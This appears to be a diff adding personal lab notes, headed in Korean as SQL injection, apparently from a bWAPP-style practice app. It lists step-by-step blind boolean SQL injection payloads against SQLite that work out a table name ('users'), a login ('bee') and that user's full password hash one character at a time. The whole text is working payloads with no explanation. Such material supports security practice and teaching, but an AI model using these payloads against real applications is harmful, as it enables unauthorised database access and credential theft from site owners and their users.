@@ -1,0 +1,47 @@
+ 6) SQL 인젝션
+
+ ① 
+
+ or length((select tbl_name from sqlite_master limit 6,1)) = 1 --
+' or length((select tbl_name from sqlite_master limit 6,1)) = 2 --
+' or length((select tbl_name from sqlite_master limit 6,1)) = 3 --
+' or length((select tbl_name from sqlite_master limit 6,1)) = 4 --
+' or length((select tbl_name from sqlite_master limit 6,1) )= 5 --
+
+
+ ② 
+
+' or substr((select tbl_name from sqlite_master limit 6,1), 1,1) = 'u' --
+' or substr((select tbl_name from sqlite_master limit 6,1), 2,1) = 's' --
+' or substr((select tbl_name from sqlite_master limit 6,1), 3,1) = 'e' --
+' or substr((select tbl_name from sqlite_master limit 6,1), 4,1) = 'r' --
+' or substr((select tbl_name from sqlite_master limit 6,1), 5,1) = 's' --
+' or (select tbl_name from sqlite_master limit 6,1) = 'users' --
+
+
+ ③ 
+
+' or length((select login from users limit 1,1)) = 1 --
+' or length((select login from users limit 1,1)) = 2 --
+' or length((select login from users limit 1,1)) = 3 --
+
+
+ ④ 
+
+' or substr((select login from users limit 1,1), 1,1) = 'b' --
+' or substr((select login from users limit 1,1), 2,1) = 'e' --
+' or substr((select login from users limit 1,1), 3,1) = 'e' --
+' or (select login from users limit 1,1) = 'bee' --
+
+
+ ⑤ 
+
+' or length((select password from users limit 1,1)) = 20 --
+' or length((select password from users limit 1,1)) = 40 --
+
+
+ ⑥ 
+
+' or substr((select password from users where login='bee'), 1,1) = '6' --
+' or substr((select password from users where login='bee'), 2,1) = '8' --
+' or (select password from users where login='bee') = '6885858486f31043e5839c735d99457f045affd0' --
